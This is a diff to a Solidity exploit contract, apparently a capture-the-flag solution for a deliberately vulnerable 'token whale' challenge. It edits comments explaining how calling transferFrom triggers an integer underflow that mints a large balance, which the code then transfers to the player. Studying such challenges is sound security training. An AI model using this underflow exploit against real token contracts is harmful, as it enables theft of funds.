@@ -72,10 +72,13 @@ contract ExploitContract {
     // write your exploit functions below
     function attack(address player) external {
         // Transfer 1 to exploit the vulnerable _transfer() function, which
-        // causes the balance of this contract to overvflow
+        // causes the balance of this contract to underflow, which gives this
+        // contract a lot of tokens. This happens because the _transfer function
+        // assumes the msg.sender is the token owner, bu that is not the case
+        // for transferFrom.
         tokenWhale.transferFrom(player, player, 1);
 
-        // Tranfer enough tokens to the player to pass the challenge
+        // Transfer enough tokens to the player to pass the challenge
         tokenWhale.transfer(player, 998_999);
     }
 }
